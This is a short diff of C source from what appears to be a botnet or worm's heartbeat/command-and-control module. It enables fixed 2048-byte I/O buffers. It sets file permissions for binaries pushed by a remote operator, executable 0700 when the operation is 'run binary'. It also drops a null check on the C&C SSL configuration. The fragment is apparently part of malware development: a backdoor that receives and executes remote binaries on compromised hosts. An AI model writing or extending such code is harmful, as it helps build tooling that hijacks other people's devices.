@@ -730,18 +730,15 @@ static void htbt_free_slv_ctx (htbt_slv_ctx_t *ctx) {
 
 static bool htbt_alloc_slv_iobuf (htbt_slv_ctx_t *ctx) {
 	bool alloc;
-#if 0 // TODO: switch on after testing
-	const size_t PAGESIZE = prne_getpagesize();
 	alloc = prne_alloc_iobuf(
 		ctx->iobuf + 0,
-		PAGESIZE);
+		2048);
 	alloc &= prne_alloc_iobuf(
 		ctx->iobuf + 1,
-		PAGESIZE);
+		2048);
 	if (alloc) {
 		return true;
 	}
-#endif
 
 	alloc = prne_alloc_iobuf(
 		ctx->iobuf + 0,
@@ -1074,7 +1071,9 @@ static bool htbt_slv_srv_bin (
 	}
 
 	errno = 0;
-	path = ctx->cbset->tmpfile(bin_meta.bin_size, 0700);
+	path = ctx->cbset->tmpfile(
+		bin_meta.bin_size,
+		mh->op == PRNE_HTBT_OP_RUN_BIN ? 0700 : 0600);
 	if (path == NULL) {
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
 		ret_errno = errno;
@@ -2447,7 +2446,6 @@ prne_htbt_t *prne_alloc_htbt (
 	if (w == NULL ||
 		param.cb_f.cnc_txtrec == NULL ||
 		param.lbd_ssl_conf == NULL ||
-		param.cncp_ssl_conf == NULL ||
 		param.main_ssl_conf == NULL ||
 		param.ctr_drbg == NULL ||
 		param.blackhole < 0)
